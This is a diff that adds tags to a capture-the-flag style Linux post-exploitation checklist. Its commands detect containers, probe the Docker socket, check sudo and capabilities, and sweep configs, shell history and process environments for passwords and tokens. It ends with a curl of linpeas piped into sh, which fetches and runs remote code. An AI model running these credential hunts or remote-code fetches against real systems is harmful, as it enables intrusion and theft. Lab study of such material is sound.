@@ -12,6 +12,7 @@ Checklist for enumerating a Linux target after landing a shell. Commands marked 
 
 ## 1. Where am I System Context
 
+<!-- cmd: linux -->
 ```bash
 id                             # [USED — every box]
 whoami
@@ -27,6 +28,7 @@ arch
 
 Cheap and reliable checks. Combine several — any positive is enough.
 
+<!-- cmd: linux -->
 ```bash
 # Definitive marker on Docker
 ls /.dockerenv                 # [USED — MonitorsFour, ohmyweb]
@@ -58,6 +60,7 @@ ls /run/secrets/kubernetes.io/ 2>/dev/null
 
 ### If in a container, next checks
 
+<!-- cmd: linux -->
 ```bash
 # Can I reach the Docker API Most game-over check there is.
 ls -la /var/run/docker.sock    # [USED — Silentium]
@@ -90,6 +93,7 @@ done       # [USED — ohmyweb]
 
 ## 3. User & Privileges
 
+<!-- cmd: linux -->
 ```bash
 id                             # [USED]
 groups                         # [USED — Kobold]
@@ -118,6 +122,7 @@ getcap -r / 2>/dev/null                     # [USED — CCTV, ohmyweb]
 ```
 
 ### Systemctl / systemd-side privesc surface
+<!-- cmd: linux -->
 ```bash
 sudo -l 2>/dev/null | grep -i systemctl                          # [USED — vulnversity]
 ls -la /etc/systemd/system/ /run/systemd/system/ 2>/dev/null
@@ -129,6 +134,7 @@ A NOPASSWD `systemctl` rule, a writable unit-file path, or membership in `wheel`
 
 ## 4. Password & Credential Hunting with `find`
 
+<!-- cmd: linux -->
 ```bash
 # Generic filename sweeps
 find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.env" -o -name "*.txt" \) 2>/dev/null | grep -v /proc   # [USED — Kobold, Silentium, CCTV]
@@ -160,6 +166,7 @@ find /home /root -name ".*history" 2>/dev/null            # [USED — Bookstore 
 
 ### Grep-based credential hunt
 
+<!-- cmd: linux -->
 ```bash
 # Whole tree (slow — filter paths in practice)
 grep -riE '(password|passwd|pwd|passwort|token|api[_-]key|secret)\s*[:=]' /etc /home /opt /var/www /srv 2>/dev/null
@@ -178,6 +185,7 @@ cat /home/*/.bash_history /root/.bash_history 2>/dev/null
 
 ### Process environment
 
+<!-- cmd: linux -->
 ```bash
 # Every visible process' env
 for pid in $(ls /proc | grep -E '^[0-9]+$'); do
@@ -196,6 +204,7 @@ ps auxe
 
 ## 5. Scheduled Tasks
 
+<!-- cmd: linux -->
 ```bash
 crontab -l                                   # [USED — CCTV]
 cat /etc/crontab                             # [USED — CCTV, bsidesgtdevelpy]
@@ -216,6 +225,7 @@ Follow the leads — a cron that transfers data over HTTP is the CCTV credential
 
 ## 6. Network
 
+<!-- cmd: linux -->
 ```bash
 # Listening ports
 ss -tulpn                                    # [USED — CCTV, cmspit]
@@ -241,6 +251,7 @@ Loopback-only ports are your ticket to SSH tunnel — see `ssh-tunneling.md` (Si
 
 ## 7. Running Services / Processes
 
+<!-- cmd: linux -->
 ```bash
 ps auxf                                      # [USED — Silentium]
 ps aux | grep -v ']$'
@@ -254,6 +265,7 @@ Use this to spot unusual services like Gogs (Silentium) or motionEye (CCTV) befo
 
 ## 8. Interesting Files & Paths
 
+<!-- cmd: linux -->
 ```bash
 # Writable /etc entries (sudoers drop-ins, cron, systemd)
 ls -la /etc/sudoers.d/
@@ -277,6 +289,7 @@ cat /etc/fstab
 
 ## 9. Software Inventory
 
+<!-- cmd: linux -->
 ```bash
 # Package listing
 dpkg -l 2>/dev/null | head -50
@@ -309,6 +322,7 @@ command -v socat
 
 If you can upload binaries:
 
+<!-- cmd: linux -->
 ```bash
 # linpeas — one-shot privesc enumeration
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
